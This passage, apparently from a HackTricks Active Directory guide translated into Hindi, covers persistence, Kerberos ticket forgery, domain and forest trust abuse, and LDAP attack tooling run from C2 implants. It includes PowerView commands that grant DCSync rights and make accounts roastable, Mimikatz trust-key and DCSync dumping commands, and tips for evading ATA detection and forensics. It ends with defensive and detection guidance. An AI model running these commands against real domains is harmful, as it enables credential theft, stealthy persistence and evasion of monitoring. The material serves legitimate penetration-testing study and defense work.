Domain में **Spool service listening** ढूंढना **abused** किया जा सकता है ताकि **acquire new credentials** किए जा सकें और privileges **escalate** की जा सकें।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

अगर **other users** **compromised** machine को **access** करते हैं, तो memory से credentials **gather** करना और यहां तक कि उनके processes में beacons **inject** करके उनकी impersonate करना संभव है।\
आमतौर पर users RDP के जरिए system access करेंगे, इसलिए यहां आपके पास third party RDP sessions पर कुछ attacks perform करने का तरीका है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने के लिए एक system प्रदान करता है, यह सुनिश्चित करते हुए कि यह **randomized**, unique, और frequently **changed** हो। ये passwords Active Directory में stored होते हैं और access केवल authorized users तक ACLs के जरिए controlled होता है। इन passwords को access करने के लिए पर्याप्त permissions होने पर, दूसरे computers तक pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised machine से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

अगर **vulnerable templates** configured हैं, तो उन्हें abuse करके privileges escalate करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आपको **Domain Admin** या उससे भी बेहतर **Enterprise Admin** privileges मिल जाते हैं, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहां मिल सकती है**](dcsync.md).

[**NTDS.dit को steal करने के तरीके के बारे में अधिक जानकारी यहां मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

ऊपर चर्चा की गई कुछ techniques persistence के लिए इस्तेमाल की जा सकती हैं।\
उदाहरण के लिए, आप कर सकते हैं:

- Users को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users को [**ASREPRoast**](asreproast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges देना

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** किसी specific service के लिए **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके एक **legitimate Ticket Granting Service (TGS) ticket** बनाता है। इस method का उपयोग **service privileges access** करने के लिए किया जाता है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker को Active Directory (AD) environment में **krbtgt account के NTLM hash** तक access मिल जाता है। यह account खास है क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए किया जाता है, जो AD network के अंदर authenticate करने के लिए जरूरी हैं।

एक बार attacker को यह hash मिल जाए, तो वह किसी भी account के लिए **TGTs** बना सकता है जिसे वह चुनता है (Silver ticket attack)।


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, लेकिन ऐसे तरीके से forged किए जाते हैं जो **common golden tickets detection mechanisms को bypass** करता है।


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**किसी account के certificates होना या उन्हें request करने में सक्षम होना** users account में persist रहने का एक बहुत अच्छा तरीका है (भले ही वह अपना password बदल दे):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग domain के अंदर high privileges के साथ persist रहने के लिए भी किया जा सकता है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करता है, इन groups पर standard **Access Control List (ACL)** लागू करके unauthorized changes को रोकता है। हालांकि, इस feature का abuse किया जा सकता है; अगर attacker AdminSDHolder की ACL modify करके किसी regular user को full access दे दे, तो वह user सभी privileged groups पर व्यापक control प्राप्त कर लेता है। यह security measure, जो protection के लिए है, इस तरह उल्टा पड़ सकता है और close monitoring न होने पर unwarranted access दे सकता है।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहां।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी machine पर admin rights हासिल करके local Administrator hash को **mimikatz** की मदद से extract किया जा सकता है। इसके बाद, इस password के उपयोग को **enable** करने के लिए registry modification जरूरी होती है, जिससे local Administrator account तक remote access मिल सके।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी specific domain objects पर किसी **user** को कुछ **special permissions** दे सकते हैं, जिससे user भविष्य में privileges **escalate** कर सकेगा।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग किसी object के ऊपर उस object की **permissions** को **store** करने के लिए किया जाता है। अगर आप किसी object के security descriptor में बस थोड़ा सा change कर सकें, तो आप उस object पर privileged group का member बने बिना ही बहुत interesting privileges हासिल कर सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का abuse करके short-lived principals/GPOs/DNS records बनाएं जिनमें `entryTTL`/`msDS-Entry-Time-To-Die` हो; वे tombstones के बिना self-delete हो जाते हैं, LDAP evidence मिटाते हैं, जबकि orphan SIDs, broken `gPLink` references, या cached DNS responses (उदा., AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects) छोड़ जाते हैं।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

**LSASS** को memory में alter करके एक **universal password** स्थापित करें, जिससे सभी domain accounts तक access मिल जाए।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[यहां जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **own SSP** बना सकते हैं ताकि machine access करने के लिए उपयोग किए गए credentials को **clear text** में **capture** किया जा सके।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **new Domain Controller** register करता है और इसका उपयोग specified objects पर **attributes push** करने के लिए करता है (SIDHistory, SPNs...) **बिना** modifications से संबंधित किसी **logs** को छोड़े। आपको **DA** privileges की जरूरत होगी और root domain के अंदर होना होगा।\
ध्यान दें कि अगर आप गलत data use करते हैं, तो बहुत ugly logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि अगर आपके पास **LAPS passwords पढ़ने की पर्याप्त permission** है तो privileges कैसे escalate किए जा सकते हैं। हालांकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका मतलब है कि **एक single domain को compromise करना पूरे Forest के compromise** तक पहुंचा सकता है।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक **domain** के user को दूसरे **domain** के resources access करने देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications smoothly flow कर सकें। जब domains trust set up करते हैं, तो वे अपने **Domain Controllers (DCs)** में specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए crucial हैं।

एक typical scenario में, अगर कोई user किसी **trusted domain** में service access करना चाहता है, तो उसे सबसे पहले अपने domain के DC से **inter-realm TGT** नाम का special ticket request करना होता है। यह TGT shared **key** से encrypted होता है जिस पर दोनों domains सहमत होते हैं। इसके बाद user इस TGT को **trusted domain के DC** के सामने पेश करता है ताकि service ticket (**TGS**) मिल सके। trusted domain के DC द्वारा inter-realm TGT सफलतापूर्वक validate होने पर, वह एक TGS जारी करता है, जिससे user को service access मिल जाता है।

**Steps**:

1. **Domain 1** में एक **client computer** अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करके process शुरू करता है।
2. अगर client successfully authenticated होता है, तो DC1 एक नया TGT issue करता है।
3. इसके बाद client, Domain 2 में resources access करने के लिए जरूरी **inter-realm TGT** DC1 से request करता है।
4. inter-realm TGT, two-way domain trust के हिस्से के रूप में DC1 और DC2 के बीच shared एक **trust key** से encrypted होता है।
5. client inter-realm TGT को **Domain 2's Domain Controller (DC2)** तक ले जाता है।
6. DC2 shared trust key का उपयोग करके inter-realm TGT verify करता है और, यदि valid हो, तो Domain 2 के server के लिए एक **Ticket Granting Service (TGS)** issue करता है जिसे client access करना चाहता है।
7. अंत में, client यह TGS server को प्रस्तुत करता है, जो server’s account hash से encrypted होता है, ताकि Domain 2 में service access मिल सके।

### Different trusts

यह ध्यान देना महत्वपूर्ण है कि **trust 1 way या 2 ways** हो सकता है। 2 ways options में, दोनों domains एक-दूसरे पर trust करेंगे, लेकिन **1 way** trust relation में domains में से एक **trusted** होगा और दूसरा **trusting** domain। आखिरी case में, **आप केवल trusted one से trusting domain के अंदर resources access कर पाएंगे**।

अगर Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted one है। साथ ही, **Domain A** में यह **Outbound trust** होगा; और **Domain B** में यह **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह same forest के अंदर एक common setup है, जहां child domain automatically अपने parent domain के साथ two-way transitive trust रखता है। मूल रूप से, इसका मतलब है कि authentication requests parent और child के बीच seamlessly flow कर सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" भी कहा जाता है, और ये referral processes को तेज करने के लिए child domains के बीच स्थापित किए जाते हैं। complex forests में, authentication referrals को सामान्यतः forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाकर, यह यात्रा छोटी हो जाती है, जो geographically dispersed environments में खास तौर पर उपयोगी है।
- **External Trusts**: ये अलग, unrelated domains के बीच set up किए जाते हैं और स्वभाव से non-transitive होते हैं। [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts current forest के बाहर किसी domain के resources access करने के लिए उपयोगी हैं, जो forest trust से connected नहीं है। external trusts के साथ SID filtering security को बढ़ाता है।
- **Tree-root Trusts**: ये trust automatically forest root domain और newly added tree root के बीच establish होते हैं। हालांकि ये आमतौर पर नहीं मिलते, tree-root trusts forest में नए domain trees जोड़ने के लिए महत्वपूर्ण हैं, जिससे वे unique domain name बनाए रख सकें और two-way transitivity सुनिश्चित हो सके। अधिक जानकारी [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह type का trust दो forest root domains के बीच two-way transitive trust होता है, और security measures को बढ़ाने के लिए SID filtering भी enforce करता है।
- **MIT Trusts**: ये trusts non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts थोड़े अधिक specialized होते हैं और Windows ecosystem के बाहर Kerberos-based systems के integration की जरूरत वाले environments के लिए बनाए जाते हैं।

#### Other differences in **trusting relationships**

- trust relationship transitive भी हो सकता है (A trust B, B trust C, तो A trust C) या non-transitive भी।
- trust relationship bidirectional trust के रूप में set up हो सकता है (दोनों एक-दूसरे पर trust करते हैं) या one-way trust के रूप में (केवल एक दूसरे पर trust करता है)।

### Attack Path

1. trusting relationships को **enumerate** करें
2. जांचें कि क्या किसी **security principal** (user/group/computer) के पास दूसरे domain के resources तक **access** है, शायद ACE entries के जरिए या दूसरे domain के groups में होने के कारण। domains across **relationships** देखें (शायद trust इसी वजह से बनाया गया था).
1. इस case में kerberoast एक और option हो सकता है.
3. जिन **accounts** से domains के through pivot किया जा सकता है, उन्हें **compromise** करें।

Attackers के पास दूसरे domain में resources access करने के लिए तीन primary mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups, जैसे server पर “Administrators” group, में जोड़ा जा सकता है, जिससे उस machine पर उनका significant control मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के भी members हो सकते हैं। हालांकि, इस method की effectiveness trust की nature और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL** में specify किया जा सकता है, खासकर **DACL** के अंदर **ACEs** के रूप में, जिससे उन्हें specific resources तक access मिलता है। जो लोग ACLs, DACLs, और ACEs के mechanics में गहराई से जाना चाहते हैं, उनके लिए “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” नाम का whitepaper एक invaluable resource है।

### Find external users/groups with permissions

आप domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** check कर सकते हैं। ये user/group **an external domain/forest** से होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके check कर सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### चाइल्ड-टू-पैरेंट forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> वहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप current domain में उपयोग होने वाली key को इनके साथ निकाल सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Enterprise admin के रूप में child/parent domain तक escalate करें, trust का दुरुपयोग करते हुए SID-History injection से:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) का कैसे exploit किया जा सकता है, यह समझना बहुत महत्वपूर्ण है। Configuration NC, Active Directory (AD) environments में पूरे forest के configuration data के लिए एक central repository के रूप में काम करता है। यह data forest के हर Domain Controller (DC) में replicate होता है, और writable DCs Configuration NC की एक writable copy बनाए रखते हैं। इसका exploit करने के लिए, किसी के पास **किसी DC पर SYSTEM privileges** होने चाहिए, बेहतर है कि child DC पर।

**Link GPO to root DC site**

Configuration NC का Sites container AD forest के भीतर domain-joined सभी computers के sites की जानकारी रखता है। किसी भी DC पर SYSTEM privileges के साथ काम करके, attackers root DC sites से GPOs link कर सकते हैं। यह action इन sites पर लागू policies को manipulate करके root domain को compromise कर सकता है।

गहराई से जानकारी के लिए, [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) पर research देखी जा सकती है।

**Compromise any gMSA in the forest**

एक attack vector में domain के भीतर privileged gMSAs को target करना शामिल है। KDS Root key, जो gMSAs के passwords calculate करने के लिए जरूरी है, Configuration NC में stored होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key को access करना और पूरे forest में किसी भी gMSA के passwords compute करना possible है।

विस्तृत analysis और step-by-step guidance यहां मिल सकती है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

इस method के लिए patience चाहिए, नए privileged AD objects के creation का wait करना होता है। SYSTEM privileges के साथ, attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control दे सकता है। इससे newly created AD objects पर unauthorized access और control मिल सकता है।

अधिक पढ़ने के लिए [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) देखें।

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability Public Key Infrastructure (PKI) objects पर control target करती है ताकि एक certificate template बनाया जा सके जो forest के किसी भी user के रूप में authentication enable करे। क्योंकि PKI objects Configuration NC में reside करते हैं, writable child DC को compromise करने से ESC5 attacks execute किए जा सकते हैं।

इस पर और details [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) में पढ़ी जा सकती हैं। जिन scenarios में ADCS नहीं है, वहाँ attacker के पास जरूरी components set up करने की capability होती है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में discussed है।

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस scenario में **your domain is trusted** by एक external one, जो आपको उस पर **undetermined permissions** देता है। आपको यह पता लगाना होगा कि **आपके domain के कौन-से principals के पास external domain पर कौन-सा access है** और फिर उसे exploit करने की कोशिश करनी होगी:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस परिदृश्य में **आपका domain** **trusting** कुछ **privileges** को एक **different domains** के principal को दे रहा है।

हालांकि, जब trusting domain द्वारा एक **domain trusted** होता है, तो trusted domain एक **user** बनाता है जिसका **predictable name** होता है और **password** के रूप में trusted password का उपयोग करता है। इसका मतलब है कि trusting domain के एक user से access लेकर trusted domain के अंदर जाना संभव है, ताकि उसे enumerate किया जा सके और अधिक privileges escalate करने की कोशिश की जा सके:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain को compromise करने का एक और तरीका यह है कि [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) खोजा जाए, जो domain trust की **opposite direction** में बनाया गया हो (जो बहुत common नहीं है)।

trusted domain को compromise करने का एक और तरीका यह है कि किसी ऐसी machine पर wait किया जाए जहाँ trusted domain का **user** **RDP** के जरिए login कर सकता हो। फिर attacker RDP session process में code inject कर सकता है और वहाँ से victim के **origin domain** को access कर सकता है।\
इसके अलावा, अगर victim ने अपनी hard drive mount की हो, तो **RDP session** process से attacker hard drive के **startup folder** में **backdoors** store कर सकता है। इस technique को **RDPInception** कहा जाता है।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID history attribute का उपयोग करके forest trusts के across होने वाले attacks का risk SID Filtering द्वारा कम किया जाता है, जो सभी inter-forest trusts पर default रूप से enabled होता है। यह इस assumption पर आधारित है कि intra-forest trusts secure हैं, और Microsoft की stance के अनुसार security boundary के रूप में domain की बजाय forest को माना जाता है।
- हालांकि, एक catch है: SID filtering applications और user access को disrupt कर सकता है, जिससे कभी-कभी इसे deactivate कर दिया जाता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दो forests के users automatic रूप से authenticated न हों। इसके बजाय, trusting domain या forest के अंदर domains और servers को access करने के लिए users को explicit permissions की आवश्यकता होती है।
- यह ध्यान देना महत्वपूर्ण है कि ये measures writable Configuration Naming Context (NC) के exploitation या trust account पर attacks से सुरक्षा नहीं देते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host Implants से LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implements करती है, जो पूरी तरह से on-host implant (जैसे, Adaptix C2) के अंदर run करती हैं। Operators pack को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से compile करते हैं, `ldap.axs` load करते हैं, और फिर beacon से `ldap <subcommand>` call करते हैं। सारा traffic current logon security context के जरिए LDAP (389) पर signing/sealing के साथ या LDAPS (636) पर auto certificate trust के साथ चलता है, इसलिए किसी socks proxy या disk artifacts की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (security descriptors सहित) के साथ-साथ `rootDSE` से forest/domain metadata निकालते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` roasting candidates, delegation settings, और existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को सीधे LDAP से expose करते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance को सूचीबद्ध करते हैं, जिससे ACL privilege escalation के लिए तुरंत targets मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Escalation & persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operator को जहाँ भी OU rights हों, वहाँ नए principals या machine accounts stage करने देते हैं। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे targets को hijack करते हैं जब write-property rights मिल जाती हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं, बिना PowerShell/ADSI artifacts छोड़े। `remove-*` counterparts injected ACEs को clean up करते हैं।

### Delegation, roasting, और Kerberos abuse

- `add-spn`/`set-spn` compromised user को तुरंत Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए mark करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को beacon से rewrite करते हैं, जिससे constrained/unconstrained/RBCD attack paths enable होते हैं और remote PowerShell या RSAT की जरूरत खत्म हो जाती है।

### sidHistory injection, OU relocation, और attack surface shaping

- `add-sidhistory` privileged SIDs को controlled principal की SID history में inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे stealthy access inheritance पूरी तरह LDAP/LDAPS के जरिए मिलती है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को उन OUs में drag कर सकता है जहाँ delegated rights पहले से मौजूद हों, फिर `set-password`, `add-groupmember`, या `add-spn` का abuse कर सकता है।
- सीमित scope वाले removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) operator द्वारा credentials या persistence harvest करने के बाद तेज rollback की अनुमति देते हैं, जिससे telemetry कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ General Defenses

[**credentials को protect करने के बारे में और जानें यहाँ।**](../stealing-credentials/credentials-protections.md)

### **Credential Protection के लिए Defensive Measures**

- **Domain Admins Restrictions**: सलाह दी जाती है कि Domain Admins को केवल Domain Controllers पर login करने की अनुमति हो, और उन्हें अन्य hosts पर उपयोग करने से बचाया जाए।
- **Service Account Privileges**: Security बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ run नहीं करना चाहिए।
- **Temporal Privilege Limitation**: DA privileges की जरूरत वाले tasks के लिए उनकी duration सीमित होनी चाहिए। यह इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 audit करें और फिर DCs/clients पर LDAP signing के साथ LDAPS channel binding enforce करें ताकि LDAP MITM/relay attempts block हों।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity की Protocol-level fingerprinting

अगर आप common AD tradecraft detect करना चाहते हैं, तो **सिर्फ operator-controlled artifacts पर निर्भर न रहें** जैसे renamed binaries, service names, temp batch files, या output paths। Legitimate Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic कैसे बनाते हैं, उसका baseline बनाएं, फिर **implementation quirks** ढूंढें जो `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` को edit करने के बाद भी बने रहते हैं।

- **High-confidence standalone candidates** (अपने baseline के खिलाफ validate करने के बाद):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- इन traits में से कई एक ही host/user/session/time window से हों तो यह किसी भी single weak field से कहीं अधिक strong है
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- ये operator के लिए बदलना आसान हैं और cross-protocol cluster suspicious क्यों है, यह explain करने के लिए best हैं
- **Operational notes**:
- कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility चाहिए
- Alerts में promote करने से पहले Samba/Linux clients, appliances, और legacy software के against validate करें
- Baseline पर confidence बढ़ने के साथ detections को enrichment -> hunting -> alerting में promote करें

### **Deception Techniques लागू करना**

- Deception लागू करने में traps सेट करना शामिल है, जैसे decoy users या computers, जिनमें passwords न expire होने वाले हों या Trusted for Delegation के रूप में marked हों। एक detailed approach में specific rights वाले users बनाना या उन्हें high privilege groups में add करना शामिल है।
- एक practical example में tools जैसे: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques deploy करने के बारे में और जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Deception की पहचान करना**

- **User Objects के लिए**: Suspicious indicators में atypical ObjectSID, कम logons, creation dates, और low bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की genuine ones से तुलना करने पर inconsistencies सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools deception पहचानने में मदद कर सकते हैं।

### **Detection Systems को Bypass करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: Ticket creation के लिए **aes** keys का उपयोग detection evade करने में मदद करता है, क्योंकि इससे NTLM पर downgrade नहीं होता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से execute करना सलाह दी जाती है, क्योंकि Domain Controller से direct execution alerts trigger करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
